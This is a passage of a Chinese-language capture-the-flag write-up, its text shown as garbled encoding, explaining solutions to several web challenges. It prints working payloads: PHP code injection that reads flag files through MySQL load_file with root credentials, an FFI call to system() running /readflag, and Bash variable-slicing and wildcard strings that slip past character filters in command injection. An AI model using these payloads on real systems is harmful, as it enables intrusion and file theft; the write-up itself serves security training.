<li>è¿™è¡Œä»£ç ä½¿ç”¨ MySQLi æ‰©å±•å»ºç«‹äº†ä¸€ä¸ªä¸ MySQL æ•°æ®åº“çš„è¿æ¥ã€‚å®ƒæŒ‡å®šäº†æ•°æ®åº“æœåŠ¡å™¨çš„ IP åœ°å€ä¸º<code>127.0.0.1</code>ï¼ˆæœ¬åœ°ä¸»æœºï¼‰ï¼Œç”¨æˆ·åæ˜¯<code>root</code>ï¼Œå¯†ç ä¹Ÿæ˜¯<code>root</code>ï¼Œè¦è¿æ¥çš„æ•°æ®åº“åç§°æ˜¯<code>ctftraining</code>ã€‚å¦‚æœè¿æ¥æˆåŠŸï¼Œ<code>$conn</code>å°†ä¿å­˜è¿™ä¸ªæ•°æ®åº“è¿æ¥å¯¹è±¡ï¼Œä»¥ä¾¿åç»­è¿›è¡Œæ•°æ®åº“æ“ä½œï¼›å¦‚æœè¿æ¥å¤±è´¥ï¼Œå°†ä¼šäº§ç”Ÿä¸€ä¸ªé”™è¯¯ä¿¡æ¯ï¼ˆä¸è¿‡åœ¨è¿™æ®µä»£ç ä¸­æ²¡æœ‰å¯¹è¿æ¥å¤±è´¥æƒ…å†µåšæ˜¾å¼å¤„ç†ï¼‰ã€‚</li>
</ul>
</li>
<li>SQL æŸ¥è¯¢è¯­å¥æ„å»ºï¼š
<ul>
<li><code>$sql = &quot;select load_file('/flag36.txt') as a&quot;;</code></li>
<li>è¿™é‡Œæ„å»ºäº†ä¸€ä¸ª SQL æŸ¥è¯¢è¯­å¥ã€‚<code>load_file()</code>æ˜¯ MySQL ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒçš„ä½œç”¨æ˜¯è¯»å–æŒ‡å®šè·¯å¾„çš„æ–‡ä»¶å†…å®¹ï¼Œå¹¶ä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¿”å›ã€‚åœ¨è¿™ä¸ªæŸ¥è¯¢ä¸­ï¼Œå®ƒè¯•å›¾è¯»å–æœåŠ¡å™¨ä¸Š<code>/flag36.txt</code>æ–‡ä»¶çš„å†…å®¹ï¼Œå¹¶ç»™æŸ¥è¯¢ç»“æœçš„è¿™ä¸€åˆ—èµ·äº†ä¸€ä¸ªåˆ«å<code>a</code>ã€‚</li>
</ul>
</li>
<li>æ‰§è¡ŒæŸ¥è¯¢å¹¶è·å–ç»“æœï¼š
<ul>
<li><code>$row = mysqli_query($conn, $sql);</code></li>
<li>è¿™è¡Œä»£ç ä½¿ç”¨å·²ç»å»ºç«‹å¥½çš„æ•°æ®åº“è¿æ¥<code>$conn</code>æ¥æ‰§è¡Œå‰é¢æ„å»ºçš„ SQL æŸ¥è¯¢è¯­å¥<code>$sql</code>ã€‚å¦‚æœæŸ¥è¯¢æ‰§è¡ŒæˆåŠŸï¼Œ<code>$row</code>å°†åŒ…å«æŸ¥è¯¢ç»“æœé›†çš„èµ„æºå¯¹è±¡ï¼ˆå¯ä»¥ç†è§£ä¸ºæŒ‡å‘æŸ¥è¯¢ç»“æœæ•°æ®çš„ä¸€ç§å¼•ç”¨ï¼‰ï¼›å¦‚æœæŸ¥è¯¢å¤±è´¥ï¼ŒåŒæ ·ä¼šäº§ç”Ÿä¸€ä¸ªé”™è¯¯ä¿¡æ¯ï¼ˆè¿™é‡Œä¹Ÿæœªåšæ˜¾å¼å¤„ç†ï¼‰ã€‚</li>
<li><code>while($result=mysqli_fetch_array($row)){ echo $result['a']; }</code></li>
<li>è¿™ä¸ª<code>while</code>å¾ªç¯ç”¨äºéå†æŸ¥è¯¢ç»“æœé›†ã€‚<code>mysqli_fetch_array()</code>å‡½æ•°æ¯æ¬¡ä»ç»“æœé›†ä¸­è·å–ä¸€è¡Œæ•°æ®ï¼Œå¹¶ä»¥æ•°ç»„çš„å½¢å¼è¿”å›ã€‚åœ¨å¾ªç¯å†…éƒ¨ï¼Œå®ƒé€šè¿‡<code>$result['a']</code>æ¥è·å–å‰é¢æŸ¥è¯¢ä¸­<code>load_file()</code>å‡½æ•°è¯»å–åˆ°çš„æ–‡ä»¶å†…å®¹ï¼ˆå› ä¸ºåœ¨æŸ¥è¯¢ä¸­ç»™è¿™ä¸€åˆ—èµ·äº†åˆ«å<code>a</code>ï¼‰ï¼Œå¹¶å°†å…¶è¾“å‡ºåˆ°å±å¹•ä¸Šã€‚</li>
</ul>
</li>
<li>ç¨‹åºç»“æŸï¼š
<ul>
<li><code>exit();</code></li>
<li>è¿™è¡Œä»£ç ä½¿å¾—è„šæœ¬åœ¨å®ŒæˆæŸ¥è¯¢ç»“æœè¾“å‡ºåç«‹å³ç»ˆæ­¢æ‰§è¡Œï¼Œä¸å†æ‰§è¡Œåç»­å¯èƒ½å­˜åœ¨çš„å…¶ä»–ä»£ç ã€‚</li>
</ul>
</li>
</ol></blockquote>
<p>ä¹Ÿå¯ä»¥</p>
<p>ç”¨PDOçš„æ–¹æ³•æ¥å®ç°åŒæ ·çš„ç›®çš„</p>
<p>payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">c</span><span class="o">=</span><span class="k">try</span> <span class="p">{</span><span class="nv">$dbh</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PDO</span><span class="p">(</span><span class="s1">&#39;mysql:host=localhost;dbname=ctftraining&#39;</span><span class="p">,</span> <span class="s1">&#39;root&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="s1">&#39;root&#39;</span><span class="p">);</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$dbh</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;select load_file(&#34;/flag36.txt&#34;)&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$row</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="p">{</span><span class="k">echo</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s2">&#34;|&#34;</span><span class="p">;</span> <span class="p">}</span><span class="nv">$dbh</span> <span class="o">=</span> <span class="k">null</span><span class="p">;}</span><span class="k">catch</span> <span class="p">(</span><span class="nx">PDOException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="nv">$e</span><span class="o">-</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="o">&gt;</span><span class="nx">getMessage</span><span class="p">();</span><span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);}</span><span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span></code></pre></div><blockquote>
<ol>
<li>æ•°æ®åº“è¿æ¥å»ºç«‹ï¼š
<ul>
<li><code>$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root', 'root');</code></li>
<li>è¿™è¡Œä»£ç ä½¿ç”¨ PDO åˆ›å»ºäº†ä¸€ä¸ªä¸ MySQL æ•°æ®åº“çš„è¿æ¥å¯¹è±¡ <code>$dbh</code>ã€‚å®ƒæŒ‡å®šäº†æ•°æ®åº“æœåŠ¡å™¨çš„ä¸»æœºåä¸º <code>localhost</code>ï¼Œè¦è¿æ¥çš„æ•°æ®åº“åç§°æ˜¯ <code>ctftraining</code>ï¼Œä»¥åŠç”¨äºç™»å½•æ•°æ®åº“çš„ç”¨æˆ·å <code>root</code> å’Œå¯†ç  <code>root</code>ã€‚å¦‚æœè¿æ¥æˆåŠŸï¼Œåç»­å°±å¯ä»¥é€šè¿‡è¿™ä¸ªå¯¹è±¡è¿›è¡Œæ•°æ®åº“ç›¸å…³çš„æ“ä½œï¼›å¦‚æœè¿æ¥å¤±è´¥ï¼Œå°†ä¼šæŠ›å‡ºä¸€ä¸ª <code>PDOException</code> å¼‚å¸¸ã€‚</li>
</ul>
</li>
<li>æ‰§è¡ŒæŸ¥è¯¢æ“ä½œï¼š
<ul>
<li><code>foreach($dbh-&gt;query('select load_file(&quot;/flag36.txt&quot;)') as $row)</code></li>
<li>è¿™é‡Œé€šè¿‡å·²å»ºç«‹çš„æ•°æ®åº“è¿æ¥å¯¹è±¡ <code>$dbh</code> æ‰§è¡Œäº†ä¸€ä¸ª SQL æŸ¥è¯¢è¯­å¥ <code>select load_file(&quot;/flag36.txt&quot;)</code>ã€‚<code>load_file()</code> æ˜¯ MySQL ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºè¯»å–æŒ‡å®šè·¯å¾„çš„æ–‡ä»¶å†…å®¹ã€‚è¿™ä¸ªæŸ¥è¯¢è¯­å¥çš„ç›®çš„å°±æ˜¯è·å–æœåŠ¡å™¨ä¸Š <code>/flag36.txt</code> æ–‡ä»¶çš„å†…å®¹ã€‚</li>
<li>ç„¶åä½¿ç”¨ <code>foreach</code> å¾ªç¯æ¥éå†æŸ¥è¯¢ç»“æœé›†ã€‚æ¯æ¬¡å¾ªç¯ï¼Œ<code>$row</code> å°†ä¼šè·å–åˆ°æŸ¥è¯¢ç»“æœé›†ä¸­çš„ä¸€è¡Œæ•°æ®ï¼Œç”±äºæŸ¥è¯¢ç»“æœåªæœ‰ä¸€åˆ—ï¼ˆå³ <code>load_file()</code> å‡½æ•°è¿”å›çš„æ–‡ä»¶å†…å®¹é‚£ä¸€åˆ—ï¼‰ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ <code>$row[0]</code> æ¥è·å–è¿™ä¸€åˆ—çš„å€¼ã€‚</li>
</ul>
</li>
</ol>
<h4 id="ç»“æœè¾“å‡ºä¸èµ„æºé‡Šæ”¾">ç»“æœè¾“å‡ºä¸èµ„æºé‡Šæ”¾<a hidden class="anchor" aria-hidden="true" href="#ç»“æœè¾“å‡ºä¸èµ„æºé‡Šæ”¾">#</a></h4>
<ol>
<li>ç»“æœè¾“å‡ºï¼š
<ul>
<li><code>echo($row[0]).&quot;|&quot;;</code></li>
<li>åœ¨æ¯æ¬¡éå†æŸ¥è¯¢ç»“æœé›†çš„å¾ªç¯ä¸­ï¼Œè¿™è¡Œä»£ç å°†è·å–åˆ°çš„æ–‡ä»¶å†…å®¹ï¼ˆé€šè¿‡ <code>$row[0]</code>ï¼‰è¾“å‡ºåˆ°å±å¹•ä¸Šï¼Œå¹¶åœ¨åé¢æ·»åŠ ä¸€ä¸ª <code>|</code> ä½œä¸ºåˆ†éš”ç¬¦ã€‚</li>
</ul>
</li>
<li>æ•°æ®åº“è¿æ¥èµ„æºé‡Šæ”¾ï¼š
<ul>
<li><code>$dbh = null;</code></li>
<li>å½“æŸ¥è¯¢ç»“æœå¤„ç†å®Œæ¯•åï¼Œè¿™è¡Œä»£ç å°†æ•°æ®åº“è¿æ¥å¯¹è±¡ <code>$dbh</code> è®¾ç½®ä¸º <code>null</code>ï¼Œè¿™æœ‰åŠ©äºé‡Šæ”¾ä¸è¯¥è¿æ¥ç›¸å…³çš„èµ„æºï¼Œç¡®ä¿ç³»ç»Ÿèµ„æºçš„åˆç†åˆ©ç”¨ã€‚</li>
</ul>
</li>
</ol>
<h4 id="å¼‚å¸¸å¤„ç†">å¼‚å¸¸å¤„ç†<a hidden class="anchor" aria-hidden="true" href="#å¼‚å¸¸å¤„ç†">#</a></h4>
<ol>
<li>æ•è·å¼‚å¸¸ï¼š
<ul>
<li><code>catch (PDOException $e) {echo $e-&gt;getMessage();exit(0);}</code></li>
<li>æ•´ä¸ª <code>try</code> ä»£ç å—è¢«æ”¾ç½®åœ¨ä¸€ä¸ª <code>try-catch</code> è¯­å¥ä¸­ã€‚å¦‚æœåœ¨å°è¯•å»ºç«‹æ•°æ®åº“è¿æ¥æˆ–æ‰§è¡ŒæŸ¥è¯¢ç­‰æ“ä½œè¿‡ç¨‹ä¸­å‡ºç°ä»»ä½• <code>PDOException</code> å¼‚å¸¸ï¼ˆæ¯”å¦‚æ•°æ®åº“è¿æ¥å¤±è´¥ã€æŸ¥è¯¢è¯­å¥è¯­æ³•é”™è¯¯ç­‰æƒ…å†µï¼‰ï¼Œå¼‚å¸¸å°†ä¼šè¢«è¿™ä¸ª <code>catch</code> å—æ•è·ã€‚</li>
<li>ä¸€æ—¦æ•è·åˆ°å¼‚å¸¸ï¼Œ<code>catch</code> å—ä¸­çš„ä»£ç å°†ä¼šæ‰§è¡Œã€‚è¿™é‡Œé¦–å…ˆé€šè¿‡ <code>$e-&gt;getMessage()</code> è·å–åˆ°å…·ä½“çš„å¼‚å¸¸æ¶ˆæ¯ï¼Œå¹¶å°†å…¶è¾“å‡ºåˆ°å±å¹•ä¸Šï¼Œç„¶åä½¿ç”¨ <code>exit(0)</code> ç»ˆæ­¢è„šæœ¬çš„æ‰§è¡Œï¼Œä»¥é˜²æ­¢åç»­å¯èƒ½å‡ºç°çš„é”™è¯¯æˆ–æœªå®šä¹‰è¡Œä¸ºã€‚</li>
</ul>
</li>
</ol></blockquote>
<h4 id="web76">web76<a hidden class="anchor" aria-hidden="true" href="#web76">#</a></h4>
<p><img alt="image-20241130003249705" loading="lazy" src="../assets/image-20241130003249705.png"></p>
<p>è¿™é¢˜ä¾æ—§æ˜¯ç”¨globåè®®æŸ¥ç›®å½•ï¼Œå¾—åˆ°æ–‡ä»¶åä¸ºflag36d.txt</p>
<p>ç”¨ä¸Šä¸€é¢˜mysqlçš„æ–¹æ³•ï¼ŒæˆåŠŸæŸ¥åˆ°flag</p>
<p>payload:</p>
<pre tabindex="0"><code>c=$conn = mysqli_connect(&#34;127.0.0.1&#34;, &#34;root&#34;, &#34;root&#34;, &#34;ctftraining&#34;); $sql = &#34;select load_file(&#39;/flag36d.txt&#39;) as a&#34;; $row = mysqli_query($conn, $sql); while($result=mysqli_fetch_array($row)){ echo $result[&#39;a&#39;]; } exit();
</code></pre><h4 id="web77">web77<a hidden class="anchor" aria-hidden="true" href="#web77">#</a></h4>
<p><img alt="image-20241130004911319" loading="lazy" src="../assets/image-20241130004911319.png"></p>
<p>ç”¨globåè®®çš„æ–¹æ³•æŸ¥å‡ºflagæ–‡ä»¶ä¸ºflag36x.phpï¼Œè¿˜æœ‰ä¸€ä¸ªreadflagæ–‡ä»¶</p>
<p>æ¥ä¸‹æ¥è¦çœ‹çœ‹æ€ä¹ˆæŸ¥æ–‡ä»¶</p>
<p><img alt="image-20241130005425204" loading="lazy" src="../assets/image-20241130005425204.png"></p>
<p>ä¸Šä¸¤é¢˜ç”¨åˆ°çš„è¯»flagçš„æ–¹æ³•ï¼ˆmysqlï¼‰è¿™é¢˜ç”¨ä¸äº†ï¼Œéœ€è¦æƒ³ç‚¹å…¶ä»–çš„æ–¹æ³•</p>
<p>å®˜æ–¹çš„wpç”¨ PHP ä¸­çš„ FFIï¼ˆForeign Function Interfaceï¼‰æ–¹æ³•æ¥è°ƒç”¨ C è¯­è¨€çš„ system å‡½æ•°ï¼Œå¹¶æ‰§è¡Œä¸€ä¸ª Shell å‘½ä»¤ã€‚</p>
<blockquote>
<h5 id="ä»€ä¹ˆæ˜¯ffi">ä»€ä¹ˆæ˜¯FFI?<a hidden class="anchor" aria-hidden="true" href="#ä»€ä¹ˆæ˜¯ffi">#</a></h5>
<p>PHP FFIï¼ˆForeign Function Interfaceï¼‰æ˜¯ PHP 7.4 åŠä»¥ä¸Šç‰ˆæœ¬å¼•å…¥çš„ä¸€ä¸ªå¼ºå¤§åŠŸèƒ½ã€‚å®ƒå…è®¸ PHP ä»£ç ç›´æ¥è°ƒç”¨ C è¯­è¨€å‡½æ•°ï¼Œä»è€Œå®ç°äº† PHP ä¸ C è¯­è¨€çš„é«˜æ•ˆäº¤äº’ã€‚è¿™ä¸º PHP å¼€å‘è€…æä¾›äº†ä¸€ç§åˆ©ç”¨ C è¯­è¨€çš„é«˜æ€§èƒ½å’Œåº•å±‚æ“ä½œç³»ç»ŸåŠŸèƒ½çš„æ–¹å¼ã€‚</p></blockquote>
<p>payload:</p>
<pre tabindex="0"><code>$ffi = FFI::cdef(&#34;int system(const char *command);&#34;);//åˆ›å»ºä¸€ä¸ªsystemå¯¹è±¡
$a=&#39;/readflag &gt; 1.txt&#39;;//æ²¡æœ‰å›æ˜¾çš„
$ffi-&gt;system($a);//é€šè¿‡$ffiå»è°ƒç”¨systemå‡½æ•°
</code></pre><p>é€šè¿‡æ‰§è¡Œç›®å½•ä¸­çš„ /readflag ç¨‹åºå¹¶å°†å…¶è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶ 1.txtä¸­ï¼ˆå› ä¸ºåªæ˜¯æ‰§è¡Œçš„è¯æ²¡æœ‰å›æ˜¾ï¼‰</p>
<p>æ‰§è¡Œä¸€ä¸‹</p>
<p><img alt="image-20241130011301444" loading="lazy" src="../assets/image-20241130011301444.png"></p>
<p>çœ‹åˆ°æœ‰å›æ˜¾åº”è¯¥æ˜¯æˆåŠŸäº†ï¼Œè®¿é—®ä¸€ä¸‹1.txt</p>
<p><img alt="image-20241130011352138" loading="lazy" src="../assets/image-20241130011352138.png"></p>
<p>ç”±äºå½“å‰ç”¨æˆ·æƒé™ä¸è¶³æˆ‘ä»¬æ˜¯ä¸èƒ½ç›´æ¥è¯»flag36x.phpæ–‡ä»¶ä¸­çš„å†…å®¹çš„ï¼Œåªèƒ½é€šè¿‡readflagï¼ˆè„šæœ¬é‡Œé¢ä¼šè¿›è¡Œææƒï¼‰æ¥è¯»</p>
<h4 id="web118">web118<a hidden class="anchor" aria-hidden="true" href="#web118">#</a></h4>
<p>åŸæ–‡åœ°å€ï¼šhttps://blog.csdn.net/Myon5/article/details/140145005</p>
<p>è¾“å…¥æ•°å­—å’Œå°å†™å­—æ¯ï¼Œå›æ˜¾ evil input</p>
<p><img alt="img" loading="lazy" src="../assets/39825df758159aeb1423f84893826541.png"></p>
<p>æŸ¥çœ‹æºç ï¼Œå‘ç°è¿™é‡Œä¼šå°†æäº¤çš„å‚æ•° code ä¼ ç»™ system å‡½æ•°</p>
<p><img alt="img" loading="lazy" src="../assets/ef28276a3cf0375675a6bde71506fcec.png"></p>
<p>ä½¿ç”¨ burpsuite æŠ“åŒ…è¿›è¡Œå•ä¸ªå­—ç¬¦çš„æ¨¡ç³Šæµ‹è¯• fuzzï¼š</p>
<p><img alt="img" loading="lazy" src="../assets/584e4b78646d635bd58f6507fe24c725.png"></p>
<p>å‘ç°è¿‡æ»¤æ‰äº†æ•°å­—å’Œå°å†™å­—æ¯ä»¥åŠä¸€äº›ç¬¦å·ï¼Œä¸‹é¢æ¡†èµ·æ¥çš„éƒ¨åˆ†æ˜¯å¯ç”¨çš„</p>
<p><img alt="img" loading="lazy" src="../assets/cce43cb38968e67bc8db9d0b7dec6750.png"></p>
<p>ç»“åˆé¢˜ç›®æç¤ºï¼šflag åœ¨ flag.php</p>
<p><img alt="img" loading="lazy" src="../assets/8eb2710f201069ae75d2229e71d76be1.png"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦æ„é€ å‡ºå‘½ä»¤å»è¯»å– flag.php</p>
<blockquote>
<p>æˆ‘ä»¬å…ˆæ¥äº†è§£ä¸€ä¸‹ Linux çš„å†…ç½®å˜é‡
åœ¨ Linux ç³»ç»Ÿä¸­ï¼Œæœ‰è®¸å¤šå†…ç½®å˜é‡ï¼ˆç¯å¢ƒå˜é‡ï¼‰ç”¨äºé…ç½®ç³»ç»Ÿè¡Œä¸ºå’Œå­˜å‚¨ç³»ç»Ÿä¿¡æ¯ã€‚</p>
<p>ï¼ˆ1ï¼‰$BASH</p>
<p>æè¿°ï¼šæŒ‡å‘å½“å‰ä½¿ç”¨çš„Bashè§£é‡Šå™¨çš„è·¯å¾„ã€‚
ç¤ºä¾‹ï¼š/bin/bash
ç”¨é€”ï¼šç”¨äºç¡®å®šæ­£åœ¨ä½¿ç”¨çš„Bashç‰ˆæœ¬å’Œè·¯å¾„ã€‚</p>
<p>ï¼ˆ2ï¼‰ $PATH</p>
<p>æè¿°ï¼šå­˜å‚¨ä¸€ç³»åˆ—è·¯å¾„ï¼Œè¿™äº›è·¯å¾„ç”¨äºæŸ¥æ‰¾å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå½“ä½ åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥å‘½ä»¤æ—¶ï¼Œç³»ç»Ÿä¼šåœ¨è¿™äº›è·¯å¾„ä¸­æŸ¥æ‰¾å¯¹åº”çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚
ç¤ºä¾‹ï¼š/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
ç”¨é€”ï¼šå½±å“å‘½ä»¤çš„æŸ¥æ‰¾å’Œæ‰§è¡Œï¼Œå¯ä»¥æ·»åŠ è‡ªå®šä¹‰è„šæœ¬æˆ–ç¨‹åºçš„è·¯å¾„ã€‚</p>
<p>ï¼ˆ3ï¼‰$HOME</p>
<p>æè¿°ï¼šå½“å‰ç”¨æˆ·çš„ä¸»ç›®å½•è·¯å¾„ã€‚
ç¤ºä¾‹ï¼š/home/username
ç”¨é€”ï¼šè¡¨ç¤ºå½“å‰ç”¨æˆ·çš„ä¸»ç›®å½•ï¼Œé€šå¸¸ç”¨äºå­˜å‚¨ç”¨æˆ·é…ç½®æ–‡ä»¶å’Œä¸ªäººæ•°æ®ã€‚</p>
<p>ï¼ˆ4ï¼‰$PWD</p>
<p>æè¿°ï¼šå½“å‰å·¥ä½œç›®å½•ï¼ˆPresent Working Directoryï¼‰ã€‚
ç¤ºä¾‹ï¼š/home/username/projects
ç”¨é€”ï¼šè¡¨ç¤ºå½“å‰çš„å·¥ä½œç›®å½•è·¯å¾„ï¼Œå¸¸ç”¨äºè„šæœ¬å’Œå‘½ä»¤ä¸­è·å–æˆ–æ˜¾ç¤ºå½“å‰ç›®å½•ã€‚</p>
<p>ï¼ˆ5ï¼‰$USER</p>
<p>æè¿°ï¼šå½“å‰ç™»å½•çš„ç”¨æˆ·åã€‚
ç¤ºä¾‹ï¼šusername
ç”¨é€”ï¼šè¡¨ç¤ºå½“å‰ç”¨æˆ·çš„åç§°ï¼Œå¸¸ç”¨äºæ˜¾ç¤ºæˆ–æ£€æŸ¥ç”¨æˆ·ä¿¡æ¯ã€‚</p>
<p>ï¼ˆ6ï¼‰$SHELL</p>
<p>æè¿°ï¼šå½“å‰ç”¨æˆ·çš„é»˜è®¤shellã€‚
ç¤ºä¾‹ï¼š/bin/bash
ç”¨é€”ï¼šè¡¨ç¤ºç”¨æˆ·ç™»å½•æ—¶ä½¿ç”¨çš„é»˜è®¤shellè·¯å¾„ã€‚</p>
<p>ï¼ˆ7ï¼‰$UID</p>
<p>æè¿°ï¼šå½“å‰ç”¨æˆ·çš„ç”¨æˆ·IDã€‚
ç¤ºä¾‹ï¼š1000ï¼ˆæ™®é€šç”¨æˆ·ï¼‰ï¼Œ0ï¼ˆrootç”¨æˆ·ï¼‰
ç”¨é€”ï¼šæ ‡è¯†å½“å‰ç”¨æˆ·çš„å”¯ä¸€IDã€‚</p>
<p>ï¼ˆ8ï¼‰$IFS</p>
<p>æè¿°ï¼šå†…éƒ¨å­—æ®µåˆ†éš”ç¬¦ï¼ˆInternal Field Separatorï¼‰ï¼Œç”¨äºåˆ†å‰²è¾“å…¥çš„å­—æ®µï¼Œé»˜è®¤ä¸ºç©ºæ ¼ã€åˆ¶è¡¨ç¬¦å’Œæ¢è¡Œç¬¦ã€‚
ç¤ºä¾‹ï¼šé»˜è®¤å€¼ä¸º<space><tab><newline>
ç”¨é€”ï¼šå½±å“è„šæœ¬ä¸­çš„å­—æ®µåˆ†å‰²ï¼Œå¸¸ç”¨äºå¤„ç†è¾“å…¥å’Œè§£ææ–‡æœ¬ã€‚</p></blockquote>
<p>æ­¤å¤–è¿˜æœ‰å¾ˆå¤šçš„å†…ç½®å˜é‡ï¼š</p>
<p><img alt="img" loading="lazy" src="../assets/3b6a3d156d5f7a2118ef1e73708dc47f.png"></p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦çŸ¥é“ Bash å˜é‡çš„åˆ‡ç‰‡ï¼Œä¸ python çš„åˆ‡ç‰‡ç±»ä¼¼ï¼Œç›®çš„è¿˜æ˜¯ä»æŒ‡å®šä½ç½®å¼€å§‹æå–å­å­—ç¬¦ä¸²ï¼Œç”¨æ³•ï¼š${VAR:offset:length}ï¼Œçœ‹ä¾‹å­ï¼š</p>
<pre tabindex="0"><code>${PWD:1:2}
</code></pre><p>æå–ä»ç¬¬äºŒä¸ªå­—ç¬¦å¼€å§‹çš„ä¸¤ä¸ªå­—ç¬¦ï¼Œå³ roï¼Œåœ¨ Bash ä¸­ï¼Œå­—ç¬¦ä¸²åˆ‡ç‰‡çš„ç´¢å¼•ä¹Ÿæ˜¯ä» 0 å¼€å§‹çš„ã€‚</p>
<p><img alt="img" loading="lazy" src="../assets/9a68ddaee573e2a4c8f029c1b1439303.png"></p>
<p>å¦‚æœåªå¡«ä¸€ä¸ªå‚æ•°ï¼Œä¼šé»˜è®¤ä»æŒ‡å®šçš„ä½ç½®å¼€å§‹æå–åˆ°å­—ç¬¦ä¸²çš„æœ«å°¾ï¼š</p>
<pre tabindex="0"><code>${PWD:3}
</code></pre><p><img alt="img" loading="lazy" src="../assets/05801ab65baf0c3f8ef755d2440035d3.png"></p>
<p>ç®€å•æµ‹ä¸€ä¸‹æˆ‘ä»¬å°±å¯ä»¥çœ‹å‡ºæ³¢æµªå·çš„æ•ˆæœï¼šä»ç»“å°¾å¼€å§‹å–</p>
<p><img alt="img" loading="lazy" src="../assets/05801ab65baf0c3f8ef755d2440035d3-20250107141042427.png"></p>
<p>ä½†æ˜¯è¿™é‡Œæ•°å­—è¢«è¿‡æ»¤äº†ï¼Œå› æ­¤æˆ‘ä»¬ä½¿ç”¨å¤§å†™å­—æ¯ç»•è¿‡ï¼š</p>
<p>å¯ä»¥å‘ç°ä»»æ„çš„å¤§å°å†™å­—æ¯ä¸æ•°å­— 0 ç­‰æ•ˆ</p>
<p><img alt="img" loading="lazy" src="../assets/20028ec8b263329b22bf7127236e5cb9.png"></p>
<p>ä¸éš¾æƒ³åˆ°è¿™é‡Œçš„ $PWD åº”è¯¥æ˜¯ /var/www/htmlï¼ˆç½‘é¡µæœåŠ¡æ‰€åœ¨çš„å¸¸è§è·¯å¾„ï¼‰ï¼›</p>
<p>è€Œ $PATH çš„ç»“å°¾åº”è¯¥ä¹Ÿæ˜¯ /binï¼ˆè¿™ä¸ªåœ¨å‰é¢æˆ‘ä»¬å·²ç»æµ‹è¯•è¿‡äº†ï¼‰ã€‚</p>
<p><img alt="img" loading="lazy" src="../assets/1f28e989351c75dc265bdf60244d9bad.png"></p>
<p>å› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ å‡º nl å‘½ä»¤æ¥è¯»å– flag.phpï¼Œç”±äº ? å¯ç”¨ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è¿›è¡Œé€šé…ï¼Œç»•è¿‡å­—æ¯çš„è¿‡æ»¤ï¼Œæ„é€  payloadï¼š</p>
<pre tabindex="0"><code>${PATH:~Q}${PWD:~Q} ????.???
</code></pre><p><img alt="img" loading="lazy" src="../assets/22118ba0371383bb7b3ff39f6dd322be.png"></p>
<p>å½“ç„¶é¢˜ç›®è¿˜ç»™äº†å…¶ä»– payloadï¼š</p>
<pre tabindex="0"><code>${PATH:${#HOME}:${#SHLVL}}${PATH:${#RANDOM}:${#SHLVL}} ?${PATH:${#RANDOM}:${#SHLVL}}??.???
</code></pre><p>åœ¨Bashä¸­ï¼Œ${#var} çš„è¯­æ³•ç”¨äºè·å–å˜é‡ var çš„é•¿åº¦ï¼ˆå³å­—ç¬¦æ•°ï¼‰ã€‚</p>
<p>è¿™ç§å½¢å¼å¯ä»¥åº”ç”¨äºä»»ä½•å˜é‡ï¼Œæ— è®ºæ˜¯å­—ç¬¦ä¸²å˜é‡è¿˜æ˜¯ç¯å¢ƒå˜é‡ã€‚</p>
<p>æˆ‘ä»¬çŸ¥é“ ${HOME} æ˜¯ /rootï¼Œå› æ­¤ ${#HOME} å°±æ˜¯ 5ã€‚</p>
<p><img alt="img" loading="lazy" src="../assets/699d0549b84964404cd7c602c5a687d5.png"></p>
<p>ä»¥æ­¤ç±»æ¨ï¼Œæœ€ç»ˆå°†è¿™äº›æ•°å­—åº”ç”¨åˆ°åˆ‡ç‰‡ä¸­å»ï¼Œç»•è¿‡å¯¹æ•°å­—çš„è¿‡æ»¤ï¼Œæ„é€ å‡ºæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚</p>
<h4 id="web119">Web119<a hidden class="anchor" aria-hidden="true" href="#web119">#</a></h4>
<p>å…ˆç”¨ä¸Šä¸€é¢˜çš„payloadæ‰“äº†ä¸€ä¸‹ï¼Œæ˜¾ç¤ºevil input</p>
<p>æµ‹äº†ä¸€ä¸‹ä¸Šé¢˜ç”¨çš„PATHè¢«banäº†</p>
<p>æ¢ä¸ªæ–¹æ³•</p>
<pre tabindex="0"><code>${PWD::${#SHLVL}}???${PWD::${#SHLVL}}??${HOME:${#HOSTNAME}:${#SHLVL}} ????.???
ç›¸å½“äº/???/??t ????.???
åŒ¹é…/bin/cat ????.???
</code></pre><p>${#SHLVL}}=1</p>
<p>${PWD::${#SHLVL}} = /</p>
<p>${#HOSTNAME}=4    //ç”¨æˆ·åçš„ä½æ•°ï¼Œè¿™é‡Œç”¨æˆ·åæ˜¯rootï¼Œæ•…ä¸º4</p>
<p>å¦ä¸€ç§æ–¹æ³•</p>
<pre tabindex="0"><code>${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???
ç›¸å½“äº/???/?????4 ????.??? æˆ–è€… /???/?????5 ????.???
